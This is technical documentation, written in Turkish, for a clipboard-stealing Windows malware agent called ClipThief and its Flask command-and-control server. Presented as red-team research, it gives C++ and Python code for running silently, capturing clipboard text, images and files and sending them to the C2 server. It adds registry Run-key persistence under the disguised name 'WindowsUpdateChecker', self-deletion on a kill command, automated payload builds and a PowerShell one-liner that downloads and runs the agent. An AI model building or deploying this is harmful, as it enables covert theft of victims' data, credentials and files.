# ClipThief — Teknik Proje Dokümantasyonu

**Yazar:** @erberkan / B3R-SEC  
**Amaç:** Red team / güvenlik araştırması  
**Mimari:** Windows Agent (C++) + Terminal C2 (Python/Flask + SQLite + Rich)

---

## İçindekiler

1. [Proje Genel Bakış](#1-proje-genel-bakış)
2. [Dizin Yapısı](#2-dizin-yapısı)
3. [Sistem Mimarisi](#3-sistem-mimarisi)
4. [Agent (C++)](#4-agent-c)
   - 4.1 [Derleme Ayarları](#41-derleme-ayarları)
   - 4.2 [Bağımlılıklar ve Kütüphaneler](#42-bağımlılıklar-ve-kütüphaneler)
   - 4.3 [Sabitler ve Global Değişkenler](#43-sabitler-ve-global-değişkenler)
   - 4.4 [UUID Üretimi](#44-uuid-üretimi)
   - 4.5 [Agent ID Kalıcılığı (Registry)](#45-agent-id-kalıcılığı-registry)
   - 4.6 [Base64 Kodlayıcı](#46-base64-kodlayıcı)
   - 4.7 [JSON Yardımcıları](#47-json-yardımcıları)
   - 4.8 [HTTP İletişimi (WinINet)](#48-http-i̇letişimi-wininet)
   - 4.9 [Sistem Bilgisi Toplama](#49-sistem-bilgisi-toplama)
   - 4.10 [Agent Kaydı](#410-agent-kaydı)
   - 4.11 [Clipboard İzleme](#411-clipboard-i̇zleme)
   - 4.12 [DIB → BMP Dönüşümü](#412-dib--bmp-dönüşümü)
   - 4.13 [Self-Destruct (Kill)](#413-self-destruct-kill)
   - 4.14 [Kalıcılık (Persist)](#414-kalıcılık-persist)
   - 4.15 [Komut Polling Thread'i](#415-komut-polling-threadi)
   - 4.16 [Mesaj Penceresi ve WndProc](#416-mesaj-penceresi-ve-wndproc)
   - 4.17 [WinMain Giriş Noktası](#417-winmain-giriş-noktası)
5. [C2 Sunucusu (Python)](#5-c2-sunucusu-python)
   - 5.1 [Bağımlılıklar](#51-bağımlılıklar)
   - 5.2 [SQLite Veritabanı](#52-sqlite-veritabanı)
   - 5.3 [REST API Endpoint'leri](#53-rest-api-endpointleri)
   - 5.4 [İn-Memory Durum Yönetimi](#54-i̇n-memory-durum-yönetimi)
   - 5.5 [Heartbeat Monitor — Agent Timeout](#55-heartbeat-monitor--agent-timeout)
   - 5.6 [Agent Builder — Otomatik Derleme](#56-agent-builder--otomatik-derleme)
   - 5.7 [Loglama Sistemi](#57-loglama-sistemi)
   - 5.8 [Rich UI — Bileşenler](#58-rich-ui--bileşenler)
   - 5.9 [Terminal UI Ekranları](#59-terminal-ui-ekranları)
   - 5.10 [Veritabanı Yönetim Ekranı](#510-veritabanı-yönetim-ekranı)
   - 5.11 [Başlatma Akışı ve Ana Döngü](#511-başlatma-akışı-ve-ana-döngü)
6. [İletişim Protokolü](#6-i̇letişim-protokolü)
7. [Veri Akışı Diyagramı](#7-veri-akışı-diyagramı)
8. [Güvenlik Notları](#8-güvenlik-notları)

---

## 1. Proje Genel Bakış

ClipThief iki bileşenden oluşur:

| Bileşen | Dil | Dosya |
|---------|-----|-------|
| **Agent** | C++ (Win32 API) | `ClipboardDump/ClipboardDump/ClipboardDump.cpp` |
| **C2 Sunucusu** | Python 3 + Flask + Rich | `C2/c2_server.py` |

Agent, hedef Windows sistemde arka planda sessizce çalışır. Clipboard değişikliklerini (metin, resim, dosya) yakalar ve HTTP üzerinden C2'ye gönderir. C2 ise Rich kütüphanesiyle renklendirilmiş terminal arayüzü sunar; operatör her agent'ı izleyebilir, geçmişe bakabilir, komut gönderebilir ve veritabanını yönetebilir.

C2 başlatıldığında kaynak kodu otomatik olarak hedef IP/port bilgisiyle derlenir, `agents/bingo.exe` olarak kaydedilir ve HTTP üzerinden servis edilir. Operatöre PowerShell one-liner payload gösterilir.

---

## 2. Dizin Yapısı

```
ClipThief/
├── ClipboardDump/
│   ├── ClipboardDump.sln               # Visual Studio solution
│   └── ClipboardDump/
│       ├── ClipboardDump.cpp           # Agent kaynak kodu (tek dosya)
│       ├── ClipboardDump.vcxproj       # MSVC proje dosyası (SubSystem=Windows)
│       └── x64/{Debug,Release}/        # Derleme çıktıları
│
├── C2/
│   ├── c2_server.py                    # C2 sunucusu (tek dosya)
│   ├── requirements.txt                # Python bağımlılıkları (flask, rich)
│   ├── setup_and_run.bat               # Windows başlatma scripti
│   ├── c2_data.db                      # SQLite veritabanı (otomatik oluşur)
│   ├── agents/                         # Derlenmiş agent EXE'leri
│   │   └── bingo.exe                   # C2 startup'ta otomatik derlenir
│   ├── downloads/                      # İndirilen clipboard dosyaları
│   └── logs/                           # Oturum log dosyaları
│       └── YYYY-MM-DD_HH-MM-SS.log     # Her başlatmada yeni dosya
│
├── PROJECT.md                          # Bu dosya (teknik dokümantasyon)
└── README.md                           # Kurulum ve kullanım kılavuzu
```

---

## 3. Sistem Mimarisi

```
┌─────────────────────────────┐          HTTP/JSON          ┌──────────────────────────────────┐
│         AGENT (C++)         │ ──────────────────────────► │       C2 SERVER (Python)         │
│                             │                             │                                  │
│  WinMain (Windows subsys.)  │  POST /api/agent/register   │  Flask REST API (daemon)         │
│  ├─ LoadOrCreateAgentId()   │  POST /api/agent/<id>/clip  │  ├─ SQLite WAL (c2_data.db)      │
│  ├─ RegisterAgent()         │  GET  /api/agent/<id>/cmd   │  ├─ In-memory agents{}           │
│  ├─ AddClipboardListener()  │ ◄──────────────────────────  │  ├─ Heartbeat monitor (daemon)   │
│  ├─ WndProc (message loop)  │  {"command":"kill|persist"}  │  ├─ Agent Builder (startup)      │
│  └─ CommandPollThread()     │                             │  └─ Rich Terminal UI (main)      │
│                             │  GET  /agent/bingo.exe      │                                  │
│  Clipboard Formats:         │ ◄──────────────────────────  │  Threads:                        │
│  ├─ CF_UNICODETEXT (text)   │  [EXE binary download]      │  ├─ flask (daemon)               │
│  ├─ CF_HDROP (files)        │                             │  ├─ heartbeat (daemon)           │
│  └─ CF_DIB (images→BMP)     │                             │  └─ main (UI loop)               │
└─────────────────────────────┘                             └──────────────────────────────────┘
         │ Registry                                                    │ c2_data.db
         │ HKCU\...\ClipAgent → AgentID = <UUID>                      │ agents + clipboard_entries
                                                                       │ logs/YYYY-MM-DD_HH-MM-SS.log
```

---

## 4. Agent (C++)

### 4.1 Derleme Ayarları

| Ayar | Değer |
|------|-------|
| Toolset | MSVC v143 (VS 2022) |
| Platform | x64 / Win32 |
| Subsystem | **Windows** (konsol penceresi yok) |
| Character Set | Unicode |
| Entry point | `WinMain` |

Subsystem `Windows` olduğu için EXE çalıştırıldığında hiçbir terminal penceresi açılmaz. Process Task Manager'da görünür ama kullanıcıya herhangi bir UI sunmaz.

> **C2 otomatik derleme:** Kaynak kodu C2'nin `build_agent()` fonksiyonu tarafından derlenir. Operatör Visual Studio'da manuel derleme yapmak zorunda değildir — `bingo.exe` her C2 başlatılmasında `--agent-ip` ve `--port` değerleriyle otomatik üretilir.

### 4.2 Bağımlılıklar ve Kütüphaneler

```cpp
#include <winsock2.h>   // Winsock2 — ws2_32.lib  (windows.h'dan önce gelmeli)
#include <ws2tcpip.h>   // getaddrinfo, inet_ntop
#include <windows.h>    // Win32 API temel
#include <wininet.h>    // HTTP — wininet.lib
#include <shellapi.h>   // DragQueryFile (CF_HDROP) — shell32.lib
#include <rpc.h>        // UuidCreate, UuidToStringA — rpcrt4.lib
```

`#pragma comment(lib, ...)` ile linker direktifleri kaynak dosyasına gömülüdür; proje dosyasında ayrıca ayar gerekmez.

> **Neden `objbase.h` değil, `rpc.h`?**  
> `WIN32_LEAN_AND_MEAN` tanımlı olduğunda `windows.h`, OLE/COM başlıklarını dışarıda bırakır.  
> `CoCreateGuid` bu yüzden derleme hatası verir. RPC kütüphanesi bu makrodan etkilenmez;  
> `UuidCreate` + `UuidToStringA` ile aynı işlev bağımlılık olmadan sağlanır.

### 4.3 Sabitler ve Global Değişkenler

```cpp
static const char* C2_HOST   = "127.0.0.1";    // C2 sunucu adresi — build_agent() tarafından yazılır
static const int   C2_PORT   = 5000;            // C2 sunucu portu  — build_agent() tarafından yazılır
static const int   POLL_MS   = 3000;            // Komut polling aralığı (ms)
static const char* REG_PATH  = "Software\\Microsoft\\Windows\\CurrentVersion\\ClipAgent";
static const char* TASK_NAME = "WindowsUpdateChecker"; // HKCU Run değer adı (persistence)
static const size_t MAX_FILE = 50 * 1024 * 1024;       // Dosya yükleme limiti (50MB)

static std::string   g_agentId;        // Kalıcı unique ID (registry'den yüklenir)
static HWND          g_hwnd = NULL;    // Message-only pencere handle'ı
static volatile bool g_running = true; // Thread sonlandırma bayrağı
```

`C2_HOST` ve `C2_PORT` değerleri `build_agent()` tarafından regex ile kaynak dosyasının geçici kopyasına yazılır; orijinal kaynak değişmez.

### 4.4 UUID Üretimi

```cpp
static std::string GenerateUUID()
{
    UUID uuid = {};
    UuidCreate(&uuid);              // Windows kriptografik RNG — RFC 4122 uyumlu

    RPC_CSTR rpcStr = nullptr;
    UuidToStringA(&uuid, &rpcStr);  // "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
    std::string result(reinterpret_cast<char*>(rpcStr));
    RpcStringFreeA(&rpcStr);        // RPC heap'ten serbest bırak
    return result;
}
```

### 4.5 Agent ID Kalıcılığı (Registry)

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ClipAgent
  └─ AgentID : REG_SZ = "a1b2c3d4-e5f6-..."
```

İlk çalıştırmada `UuidCreate` ile yeni ID üretilir ve registry'e yazılır.  
Sonraki çalıştırmalarda aynı key okunur — C2 tarafında aynı agent olarak tanınır.  
`SelfDestruct()` çağrıldığında `RegDeleteKeyA` ile bu key silinir.

**Neden HKCU?** `HKLM` yazımı yönetici yetkisi gerektirir. `HKCU` standart kullanıcıyla erişilebilir.

### 4.6 Base64 Kodlayıcı

Harici kütüphane olmadan RFC 4648 uyumlu implementasyon. Üç wrapper:

| Fonksiyon | Kullanım |
|-----------|---------|
| `Base64Encode(const BYTE*, size_t)` | Ham byte dizisi |
| `Base64EncodeVec(const vector<BYTE>&)` | Resim / dosya verisi |
| `Base64EncodeStr(const string&)` | Metin clipboard |

### 4.7 JSON Yardımcıları

Harici JSON kütüphanesi olmadan iki minimal fonksiyon:

```cpp
// " \ \n \r \t karakterlerini escape eder
static std::string JsonEscape(const std::string& s);

// Flask'ın "key": "value" formatını parse eder (kolon sonrası boşluk toleranslı)
static std::string JsonGetString(const std::string& json, const std::string& key);
```

> **Neden özel parser?** Flask'ın `jsonify` çıktısı `{"key": "value"}` üretir (kolon sonrası boşluk).
> Standart `"key":"` araması her zaman `npos` döndürür. Parser kolon ile açılış tırnağı
> arasındaki tüm boşluk/tab karakterlerini atlayarak her iki formatı da doğru parse eder.

### 4.8 HTTP İletişimi (WinINet)

```
InternetOpenA()           → HINTERNET oturumu aç
  └─ InternetConnectA()   → Host:Port bağlantısı
       └─ HttpOpenRequestA("POST" | "GET", path)
            └─ HttpSendRequestA(headers, body)
                 └─ InternetReadFile() döngüsü → yanıt oku
                      └─ Her handle InternetCloseHandle ile kapatılır
```

Hata durumunda erken çıkış yollarının tümünde handle temizliği garantilenir.

### 4.9 Sistem Bilgisi Toplama

| Fonksiyon | Win32 API | Çıktı |
|-----------|-----------|-------|
| `GetUsername()` | `GetUserNameA` | Oturum açmış kullanıcı adı |
| `GetHostname()` | `GetComputerNameA` | NetBIOS makine adı |
| `GetLocalIP()` | `gethostname` + `getaddrinfo` | IPv4 adresi |
| `GetOSVersion()` | `RtlGetVersion` (ntdll.dll) | "Windows 10.0 Build 19045" |

**Neden `RtlGetVersion`?**  
`GetVersionEx` Windows 8.1'den itibaren uygulama uyumluluk shim'leri nedeniyle manifesto versiyonunu döndürebilir. `RtlGetVersion` kernel seviyesinde çalışır; her zaman gerçek build numarasını verir.

### 4.10 Agent Kaydı

Başlangıçta `POST /api/agent/register` ile sistem bilgileri C2'ye gönderilir.  
C2 erişilemez durumdaysa `HttpPost` sessizce `false` döndürür; agent çalışmaya devam eder.

### 4.11 Clipboard İzleme

`AddClipboardFormatListener(hwnd)` ile mesaj sistemine kayıt olunur. Her değişimde `WM_CLIPBOARDUPDATE` gelir.

**Format öncelik sırası:**

```
WM_CLIPBOARDUPDATE
│
├─ CF_UNICODETEXT var mı?
│   └─ Evet → GlobalLock → WideCharToMultiByte(CP_UTF8) → Base64 → POST "text"
│              GlobalUnlock → CloseClipboard → return
│
├─ CF_HDROP var mı? (dosya kopyalama)
│   └─ Evet → DragQueryFile → max 5 dosya yolu
│              Her dosya: ifstream binary → max 50MB → Base64 → POST "file"
│              GlobalUnlock → CloseClipboard → return
│
└─ CF_DIB var mı? (ekran görüntüsü / resim)
    └─ Evet → DibToBmp() → BMP bytes → Base64 → POST "image"
               CloseClipboard → return
```

**CF_UNICODETEXT neden CF_TEXT yerine?**  
`CF_TEXT` ANSI'dir; Türkçe/Arapça/Çince karakterleri bozar. `CF_UNICODETEXT` UTF-16 içerir; `WideCharToMultiByte(CP_UTF8)` ile kayıpsız UTF-8'e çevrilir.

### 4.12 DIB → BMP Dönüşümü

`CF_DIB` formatı: `BITMAPINFOHEADER + renk tablosu + piksel verisi`.  
Geçerli `.bmp` için başına `BITMAPFILEHEADER` eklenir — GDI+ veya libpng gerekmez.

```cpp
BITMAPFILEHEADER bfh = {};
bfh.bfType    = 0x4D42;  // 'BM'
bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + bih->biSize + colorTableSize;
bfh.bfSize    = sizeof(BITMAPFILEHEADER) + dataSize;
// Header + DIB verisi → tek buffer → Base64 → C2
```

### 4.13 Self-Destruct (Kill)

```
1. RegDeleteKeyA(HKCU, REG_PATH)     → Agent ID'yi registry'den sil
2. RegDeleteValueA(HKCU, Run key)    → Persistence Run değerini sil (varsa)
3. GetModuleFileNameA()               → Kendi EXE yolunu al
4. %TEMP%\cleanup_<PID>.bat oluştur:
       ping 127.0.0.1 -n 4 >nul      → Process çıkana kadar ~3s bekle
       del /f /q "<exePath>"          → EXE'yi sil
       del /f /q "%~f0"              → Batch dosyasını da sil
5. ShellExecuteA("open", batPath, SW_HIDE) → Batch'i gizli başlat
6. ExitProcess(0)                    → Process sonlan
```

> **Bilinen kısıt:** Windows 10/11'de `.bat` dosyasını `ShellExecuteA("open", ...)` ile  
> açmak güvenilir değildir — sessizce başarısız olabilir.  
> Alternatif: `cmd.exe /C ping ... & del ...` komutunu `ShellExecuteExA` veya  
> `CreateProcess` + `CREATE_NO_WINDOW` ile doğrudan çalıştırmak daha sağlıklıdır.

### 4.14 Kalıcılık (Persist)

HKCU Run registry key ile kalıcılık sağlanır — yönetici yetkisi gerekmez.

```cpp
static void AddPersistence()
{
    char exePath[MAX_PATH] = {};
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    // HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    // Her kullanıcı girişinde tetiklenir; admin yetkisi gerekmez.
    HKEY hKey = NULL;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, TASK_NAME, 0, REG_SZ,
                       (const BYTE*)exePath, (DWORD)(strlen(exePath) + 1));
        RegCloseKey(hKey);
    }
}
```

**Yazılan registry yolu:**  
`HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateChecker` = `<EXE yolu>`

Elle kaldırma:
```cmd
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateChecker /f
```

### 4.15 Komut Polling Thread'i

```cpp
static DWORD WINAPI CommandPollThread(LPVOID)
{
    std::string path = "/api/agent/" + g_agentId + "/command";
    while (g_running) {
        Sleep(POLL_MS);   // 3s bekle
        std::string resp;
        if (HttpGet(path, resp)) {
            std::string cmd = JsonGetString(resp, "command");
            if (cmd == "kill")    SelfDestruct();   // geri dönmez
            if (cmd == "persist") AddPersistence();
            // cmd == "none" → yok say
        }
    }
    return 0;
}
```

Komut C2'de `pending_cmds` map'ine konulur; bir sonraki polling'de teslim edilir ve map'ten silinir (tek seferlik teslimat). Her polling aynı zamanda `last_seen` güncellediğinden ayrı bir heartbeat endpoint'i gerekmez.

### 4.16 Mesaj Penceresi ve WndProc

```cpp
g_hwnd = CreateWindowExW(0, L"ClipThiefWnd", L"", 0,
                          0, 0, 0, 0,
                          HWND_MESSAGE, NULL, hInstance, NULL);
```

`HWND_MESSAGE` penceresi ekranda görünmez, Alt+Tab'da çıkmaz, sadece mesaj alır.

```cpp
case WM_CLIPBOARDUPDATE: HandleClipboardUpdate(); return 0;
case WM_DESTROY:         PostQuitMessage(0);      return 0;
```

### 4.17 WinMain Giriş Noktası

```cpp
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int)
{
    WSAStartup(MAKEWORD(2, 2), &wsa);   // Winsock başlat
    g_agentId = LoadOrCreateAgentId();  // Registry'den ID yükle/oluştur
    RegisterAgent();                     // C2'ye kayıt ol (sessiz hata)

    RegisterClassW(&wc);
    CreateWindowExW(..., HWND_MESSAGE, ...);
    AddClipboardFormatListener(g_hwnd);

    CreateThread(NULL, 0, CommandPollThread, NULL, 0, NULL);

    MSG msg = {};
    while (g_running) {
        BOOL ret = GetMessageW(&msg, NULL, 0, 0);
        if (ret == 0 || ret == -1) break;
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    RemoveClipboardFormatListener(g_hwnd);
    g_running = false;
    WaitForSingleObject(hThread, 2000);
    WSACleanup();
    return 0;
}
```

`WinMain` + `SubSystem=Windows` → konsol penceresi açılmaz, arka planda sessizce çalışır.

---

## 5. C2 Sunucusu (Python)

### 5.1 Bağımlılıklar

```
flask>=3.0.0    # HTTP REST API sunucusu
rich>=13.0.0    # Renkli terminal UI (tablo, panel, syntax highlight, prompt)
sqlite3         # Python standart kütüphanesi — kurulum gerektirmez
```

`build_agent()` için ek gereksinim: Visual Studio 2022 (C++ Desktop workload) — `MSBuild.exe` ve Windows SDK'sı kurulu olmalıdır.

### 5.2 SQLite Veritabanı

**Dosya:** `C2/c2_data.db`  
**Mod:** WAL (Write-Ahead Logging) — Flask thread'leri ve UI thread'i eş zamanlı R/W güvenli.

**Şema:**

```sql
CREATE TABLE agents (
    id         TEXT PRIMARY KEY,   -- UUID (rpc.h UuidCreate)
    user       TEXT,               -- Windows kullanıcı adı
    hostname   TEXT,               -- NetBIOS makine adı
    ip         TEXT,               -- IPv4 adresi
    os         TEXT,               -- "Windows 10.0 Build 19045"
    first_seen TEXT,               -- İlk bağlantı zamanı
    last_seen  TEXT,               -- Son aktivite (polling ile güncellenir)
    status     TEXT                -- "active" | "dead"
);

CREATE TABLE clipboard_entries (
    rowid      INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id   TEXT NOT NULL,      -- agents.id FK
    seq        INTEGER NOT NULL,   -- Agent başına artan sıra numarası
    type       TEXT NOT NULL,      -- "text" | "image" | "file"
    content    TEXT NOT NULL,      -- Base64 kodlu içerik
    filename   TEXT,               -- Dosya/resim orijinal adı (metin için boş)
    timestamp  TEXT NOT NULL,      -- "2026-04-21 14:32:11"
    FOREIGN KEY(agent_id) REFERENCES agents(id)
);
```

**DB fonksiyonları:**

| Fonksiyon | İşlev |
|-----------|-------|
| `db_connect()` | WAL modlu bağlantı açar, `row_factory=Row` |
| `db_init()` | Tabloları oluşturur, agents'ı belleğe yükler |
| `db_upsert_agent(info)` | `INSERT ... ON CONFLICT DO UPDATE` |
| `db_insert_clip(...)` | Yeni clipboard kaydı ekler |
| `db_get_clips(agent_id)` | Agent'ın tüm clipboard geçmişini seq sırasıyla döndürür |
| `db_next_seq(agent_id)` | `MAX(seq)+1` — agent başına sıra numarası |
| `db_clear_all()` | Her iki tabloyu tamamen temizler |
| `db_clear_agent(agent_id)` | Tek agent ve clipboard'larını siler |

### 5.3 REST API Endpoint'leri

#### `POST /api/agent/register`

**Request body:**
```json
{
  "id":       "a1b2c3d4-e5f6-...",
  "user":     "erberkan",
  "hostname": "DESKTOP-ABC123",
  "ip":       "192.168.1.50",
  "os":       "Windows 10.0 Build 19045"
}
```

**Davranış:**
- **Yeni agent:** `agents{}` + DB'ye ekle → `new_agent_queue.put()` → Rich Panel bildirimi → log INFO
- **Reconnect:** `last_seen` + `status="active"` güncelle → renkli bildirim → log INFO

#### `POST /api/agent/<id>/clipboard`

**Request body:**
```json
{ "type": "text", "content": "<base64>", "filename": "" }
```

`type`: `"text"` | `"image"` | `"file"`  
Her çağrıda `db_next_seq` ile sıra numarası alınır, DB'ye yazılır, log INFO.

#### `GET /api/agent/<id>/command`

**Response:** `{"command": "none" | "kill" | "persist"}`

`pending_cmds.pop(agent_id, "none")` — komut bir kez teslim edilir, map'ten silinir.  
Aynı zamanda `last_seen` güncellenir (polling = heartbeat). Komut `none` değilse log INFO.

#### `GET /agent/bingo.exe`

Derlenmiş agent EXE'sini binary olarak serve eder. `agents/bingo.exe` dosyası startup'ta `build_agent()` tarafından üretilir. İndirme log INFO, dosya yoksa log WARNING.

### 5.4 İn-Memory Durum Yönetimi

```python
agents: dict       = {}              # DB'nin hızlı erişim kopyası
pending_cmds: dict = {}              # agent_id → "kill" | "persist"
db_lock            = threading.Lock()  # agents + pending_cmds thread safety
new_agent_queue    = queue.Queue()   # Flask thread → UI thread haberleşmesi
AGENT_TIMEOUT_SEC  = 10             # Heartbeat timeout eşiği (saniye)
```

`_ui_lock` ayrı bir kilit — terminal yazma/okuma operasyonlarını serialize eder.  
`db_lock` DB ve bellek durumunu korur.  
İki kilit birbirinden bağımsız; deadlock riski yoktur.

### 5.5 Heartbeat Monitor — Agent Timeout

```python
def _heartbeat_monitor():
    """Arka plan thread — polling durduğunda agent'ı dead işaretler."""
    while True:
        time.sleep(5)           # Her 5 saniyede kontrol
        now = datetime.now()
        with db_lock:
            for agent_id, a in agents.items():
                if a["status"] == "dead": continue
                elapsed = (now - datetime.strptime(a["last_seen"], fmt)).total_seconds()
                if elapsed > AGENT_TIMEOUT_SEC:   # > 10s polling yok
                    a["status"] = "dead"
                    db_upsert_agent(a)
                    log.warning(f"AGENT DEAD  id={agent_id}  elapsed={int(elapsed)}s")
                    _notify("dead", f"AGENT DEAD  {a['user']}@{a['hostname']}  ...")
```

**Zaman çizelgesi (KILL sonrası):**

| t | Olay |
|---|------|
| 0s | Kill komutu kuyruğa alındı — log INFO |
| ~3s | Son polling — agent komutu alır, kapanır — log INFO |
| ~13s | Heartbeat monitor timeout'u algılar |
| ~15s | `[!] AGENT DEAD` bildirimi + log WARNING |

Agent yeniden başlarsa `api_register` status'u `"active"` yapar ve reconnect bildirimi + log INFO verilir.

### 5.6 Agent Builder — Otomatik Derleme

C2 başlatıldığında `build_agent(c2_ip, c2_port)` çalışır:

```
1. CPP_SRC ve VCXPROJ_SRC varlığını doğrula
2. _find_msbuild() — MSBuild.exe'yi bul:
       a. vswhere.exe (C:\Program Files (x86)\Microsoft Visual Studio\Installer\)
       b. Fallback: VS2022/2019 × Community/Professional/Enterprise/BuildTools
3. tempfile.TemporaryDirectory() oluştur
4. ClipboardDump.cpp kaynak metnini oku
5. regex ile C2_HOST ve C2_PORT değerlerini yaz:
       static const char* C2_HOST = "<c2_ip>"
       static const int   C2_PORT = <c2_port>
6. Geçici dizine modifiye CPP + orijinal vcxproj kopyala
7. MSBuild çalıştır:
       msbuild ClipboardDump.vcxproj
           /p:Configuration=Release /p:Platform=x64
           /p:OutDir=<tmp>/out/ /nologo /verbosity:quiet
8. Çıktı EXE'yi agents/bingo.exe olarak kopyala
9. /agent/bingo.exe endpoint'i üzerinden serve et
```

**Argüman çözümleme (`--agent-ip`):**

```python
if args.agent_ip:           agent_ip = args.agent_ip     # Açıkça verildi
elif args.host != "0.0.0.0": agent_ip = args.host        # Spesifik listen adresi
else:                         agent_ip = _get_local_ip()  # Otomatik tespit
```

`_get_local_ip()`: `socket.connect("8.8.8.8:80")` + `getsockname()` — en kısa yoldan primary NIC IP'si.

**Payload gösterimi (startup'ta):**

```
╭──  PowerShell One-Liner  ─────────────────────────────────────────────────────╮
│  $p="$env:TEMP\bingo.exe";(New-Object Net.WebClient).DownloadFile(           │
│  'http://192.168.1.100:5000/agent/bingo.exe',$p);Start-Process $p            │
╰───────────────────────────────────────────────────────────────────────────────╯
```

### 5.7 Loglama Sistemi

**Dosya:** `C2/logs/<YYYY-MM-DD_HH-MM-SS>.log`  
Her C2 başlatmasında yeni bir log dosyası açılır. Eski oturumların logları korunur.

**Kurulum:**

```python
def _setup_logger() -> logging.Logger:
    LOGS_DIR.mkdir(parents=True, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    fh = logging.FileHandler(LOGS_DIR / f"{ts}.log", encoding="utf-8")
    fh.setFormatter(logging.Formatter(
        "%(asctime)s  %(levelname)-8s  %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    ))
    ...
```

**Log seviyeleri ve olayları:**

| Seviye | Olay |
|--------|------|
| INFO | `SERVER START` — başlatma parametreleri |
| INFO | `BUILD START` — derleme başladı |
| INFO | `BUILD OK` — bingo.exe boyutu |
| ERROR | `BUILD FAILED` — MSBuild hatası, kaynak bulunamadı |
| INFO | `AGENT NEW` — id, user, hostname, ip, os |
| INFO | `AGENT RECONNECT` — id, user, hostname, ip |
| INFO | `CLIPBOARD` — id, type, seq, preview (80 karakter) |
| INFO | `COMMAND QUEUED` — operatör kill/persist kuyrukladı |
| INFO | `COMMAND SENT` — agent komutu polling ile aldı |
| INFO | `AGENT DOWNLOAD` — bingo.exe başarıyla indirildi |
| WARNING | `AGENT DOWNLOAD FAILED` — bingo.exe bulunamadı |
| WARNING | `AGENT DEAD` — timeout, elapsed saniye |
| WARNING | `DB CLEARED` — tüm veriler silindi |
| INFO | `AGENT DELETED` — tek agent silindi |
| INFO | `SERVER STOP` — operatör çıkış yaptı |

**Örnek log çıktısı:**
```
2026-04-22 14:30:00  INFO      SERVER START    listen=0.0.0.0:5000  agent_ip=192.168.1.100
2026-04-22 14:30:01  INFO      BUILD START     c2_ip=192.168.1.100  c2_port=5000
2026-04-22 14:30:08  INFO      BUILD OK        output=agents\bingo.exe  size=98,304 bytes
2026-04-22 14:32:11  INFO      AGENT NEW       id=a1b2c3...  user=john  hostname=PC-01
2026-04-22 14:32:15  INFO      CLIPBOARD       id=a1b2c3...  type=text  seq=1  preview='SELECT * FROM users'
2026-04-22 14:35:00  INFO      AGENT DOWNLOAD  bingo.exe served  src=10.0.0.10
2026-04-22 14:40:00  INFO      COMMAND QUEUED  id=a1b2c3...  command=kill  by=operator
2026-04-22 14:40:03  INFO      COMMAND SENT    id=a1b2c3...  command=kill
2026-04-22 14:40:15  WARNING   AGENT DEAD      id=a1b2c3...  elapsed=12s
2026-04-22 15:00:00  WARNING   DB CLEARED      all agents and clipboard entries wiped  by=operator
2026-04-22 16:00:00  INFO      SERVER STOP     operator quit
```

### 5.8 Rich UI — Bileşenler

| Rich Bileşeni | Kullanım Yeri |
|---------------|--------------|
| `rich.table.Table` | Agent listesi, clipboard geçmişi |
| `rich.panel.Panel` | Yeni agent bildirimi, agent detayları, DB stats, PowerShell payload |
| `rich.text.Text` | Renkli etiketli içerik bloğu |
| `rich.syntax.Syntax` | Clipboard metin — syntax highlighting |
| `rich.prompt.Confirm` | KILL / Wipe onayı |
| `rich.console.Console` | Tüm terminal çıktısı |

**Renk kodlaması:**

| Durum / Tip | Renk |
|-------------|------|
| `● active` | Yeşil |
| `✗ dead` | Kırmızı |
| `[TXT]` | Cyan |
| `[IMG]` | Sarı |
| `[FILE]` | Yeşil |
| DEAD bildirimi | Kırmızı bold |
| RECONNECT bildirimi | Sarı bold |
| PowerShell payload | Sarı bold |
| Payload panel border | Yeşil |

**Syntax dil tespiti (`_detect_lang`):**

```python
if text.startswith(("{", "[")):      → "json"
if "SELECT " in text.upper():        → "sql"
if "def " in text or "import " in:  → "python"
if text.startswith("<"):             → "xml"
else:                                → "text"  (plain panel)
```

### 5.9 Terminal UI Ekranları

**Ana ekran — `screen_agent_list()`**
```
╭────┬────────────┬──────────┬──────────────────┬─────────────────┬─────────────────────┬──────────╮
│  # │ ID         │ USER     │ HOSTNAME         │ IP              │ LAST SEEN           │ STATUS   │
├────┼────────────┼──────────┼──────────────────┼─────────────────┼─────────────────────┼──────────┤
│  1 │ a1b2c3d4...│ erberkan │ DESKTOP-ABC123   │ 192.168.1.50   │ 2026-04-21 14:35:00 │ ● active │
│  2 │ f9e8d7c6...│ admin    │ WORKSTATION-02   │ 10.0.0.15      │ 2026-04-21 14:20:00 │ ✗ dead   │
╰────┴────────────┴──────────┴──────────────────┴─────────────────┴─────────────────────┴──────────╯
```

**Agent menüsü — `screen_agent_menu()`**

```
╭─ Agent Details ──────────────────────────────╮
│ Agent ID:   a1b2c3d4-e5f6-...               │
│ User:       erberkan                         │
│ Hostname:   DESKTOP-ABC123                   │
│ IP:         192.168.1.50                     │
│ OS:         Windows 10.0 Build 19045         │
│ First seen: 2026-04-21 14:32:11              │
│ Last seen:  2026-04-21 14:35:00              │
│ Status:     ● active                         │
│ Clipboard:  47 entries                       │
╰──────────────────────────────────────────────╯

  [1] View clipboard history
  [2] Send KILL command  (self-destruct + delete)
  [3] Send PERSIST command  (add Run registry key)
  [4] Delete this agent from DB
  [0] Back
```

**Clipboard geçmişi — `screen_clipboard_list()`**

```
╭─ Clipboard — a1b2c3d...  (47 entries) ──────────────────────────────────────────╮
│  #   │ TYPE  │ TIMESTAMP             │ PREVIEW / FILENAME                       │
│    1 │ [TXT] │ 2026-04-21 14:32:15  │ SELECT * FROM users WHERE id=1            │
│    2 │ [IMG] │ 2026-04-21 14:35:01  │ clipboard.bmp                             │
│    3 │ [FILE]│ 2026-04-21 14:38:44  │ salary_report.xlsx                        │
